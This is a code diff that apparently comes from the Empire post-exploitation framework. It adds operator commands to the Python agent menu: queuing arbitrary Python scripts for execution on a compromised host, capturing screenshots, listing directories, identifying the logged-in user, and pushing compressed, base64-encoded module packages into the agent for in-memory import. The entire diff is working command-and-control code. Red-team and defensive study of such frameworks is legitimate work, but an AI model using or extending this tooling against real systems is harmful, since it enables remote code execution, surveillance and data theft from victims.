@@ -29,6 +29,8 @@ import listeners
 import modules
 import stagers
 import credentials
+from zlib_wrapper import compress
+from zlib_wrapper import decompress
 
 
 # custom exceptions used for nested menu navigation
@@ -2434,6 +2436,26 @@ class PythonAgentMenu(cmd.Cmd):
             msg = "Tasked agent to run Python command %s" % (line)
             self.mainMenu.agents.save_agent_log(self.sessionID, msg)
 
+    def do_pythonscript(self, line):
+        "Load and execute a python script"
+        path = line.strip()
+
+        if os.path.splitext(path)[-1] == '.py' and os.path.isfile(path):
+            filename = os.path.basename(path).rstrip('.py')
+            open_file = open(path, 'r')
+            script = open_file.read()
+            open_file.close()
+            script = script.replace('\r\n', '\n')
+            script = script.replace('\r', '\n')
+
+            msg = "[*] Tasked agent to execute python script: "+filename
+            print helpers.color(msg, color="green")
+            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", script)
+            #update the agent log
+            self.mainMenu.agents.save_agent_log(self.sessionID, msg)
+        else:
+            print helpers.color("[!] Please provide a valid path", color="red")
+
 
     def do_sysinfo(self, line):
         "Task an agent to get system information."
@@ -2522,11 +2544,98 @@ class PythonAgentMenu(cmd.Cmd):
         else:
             self.mainMenu.modules.search_modules(searchTerm)
 
+    def do_sc(self, line):
+        "Use pyobjc and Foundation libraries to take a screenshot, and save the image to the server"
+
+        if self.mainMenu.modules.modules['python/collection/osx/native_screenshot']:
+            module = self.mainMenu.modules.modules['python/collection/osx/native_screenshot']
+            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
+            #execute screenshot module
+            msg = "[*] Tasked agent to take a screenshot"
+            module_menu = ModuleMenu(self.mainMenu, 'python/collection/osx/native_screenshot')
+            print helpers.color(msg, color="green")
+            self.mainMenu.agents.save_agent_log(self.sessionID, msg)
+            module_menu.do_execute("")
+        else:
+            print helpers.color("[!] python/collection/osx/screenshot module not loaded")
+
+    def do_ls(self, line):
+        "List directory contents at the specified path"
+        #http://stackoverflow.com/questions/17809386/how-to-convert-a-stat-output-to-a-unix-permissions-string
+        if self.mainMenu.modules.modules['python/management/osx/ls']:
+            module = self.mainMenu.modules.modules['python/management/osx/ls']
+            if line.strip() != '':
+                module.options['Path']['Value'] = line.strip()
+
+            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
+            module_menu = ModuleMenu(self.mainMenu, 'python/management/osx/ls')
+            msg = "[*] Tasked agent to list directory contents of: "+str(module.options['Path']['Value'])
+            print helpers.color(msg,color="green")
+            self.mainMenu.agents.save_agent_log(self.sessionID, msg)
+            module_menu.do_execute("")
+
+        else:
+            print helpers.color("[!] python/management/osx/ls module not loaded")
+
+    def do_whoami(self, line):
+        "Print the currently logged in user"
+
+        command = "from AppKit import NSUserName; print str(NSUserName())"
+        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", command)
+        msg = "Tasked agent to print currently logged on user"
+        self.mainMenu.agents.save_agent_log(self.sessionID, msg)
+
+    def do_loadpymodule(self, line):
+        "Import zip file containing a .py module or package with an __init__.py"
+
+        path = line.strip()
+        #check the file ext and confirm that the path given is a file
+        if os.path.splitext(path)[-1] == '.zip' and os.path.isfile(path):
+            #open a handle to the file and save the data to a variable, zlib compress
+            filename = os.path.basename(path).rstrip('.zip')
+            open_file = open(path, 'rb')
+            module_data = open_file.read()
+            open_file.close()
+            msg = "Tasked agent to import "+path+" : "+hashlib.md5(module_data).hexdigest()
+            print helpers.color("[*] "+msg, color="green")
+            self.mainMenu.agents.save_agent_log(self.sessionID, msg)
+            c = compress.compress()
+            start_crc32 = c.crc32_data(module_data)
+            comp_data = c.comp_data(module_data, 9)
+            module_data = c.build_header(comp_data, start_crc32)
+            module_data = helpers.encode_base64(module_data)
+            data = filename + '|' + module_data
+            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_IMPORT_MODULE", data)
+        else:
+            print helpers.color("[!] Please provide a valid zipfile path", color="red")
+
+    def do_viewrepo(self, line):
+        "View the contents of a repo. if none is specified, all files will be returned"
+        repoName = line.strip()
+        msg = "[*] Tasked agent to view repo contents: " + repoName
+        print helpers.color(msg, color="green")
+        self.mainMenu.agents.save_agent_log(self.sessionID, msg)
+        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_VIEW_MODULE", repoName)
+
+    def do_removerepo(self, line):
+        "Remove a repo"
+        repoName = line.strip()
+        msg = "[*] Tasked agent to remove repo: "+repoName
+        print helpers.color(msg, color="green")
+        self.mainMenu.agents.save_agent_log(self.sessionID, msg)
+        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_REMOVE_MODULE", repoName)
 
     def do_creds(self, line):
         "Display/return credentials from the database."
         self.mainMenu.do_creds(line)
 
+    def complete_loadpymodule(self, text, line, begidx, endidx):
+        "Tab-complete a zip file path"
+        return helpers.complete_path(text, line)
+
+    def complete_pythonscript(self, text, line, begidx, endidx):
+        "Tab-complete a zip file path"
+        return helpers.complete_path(text, line)
 
     def complete_usemodule(self, text, line, begidx, endidx):
         "Tab-complete an Empire Python module path"
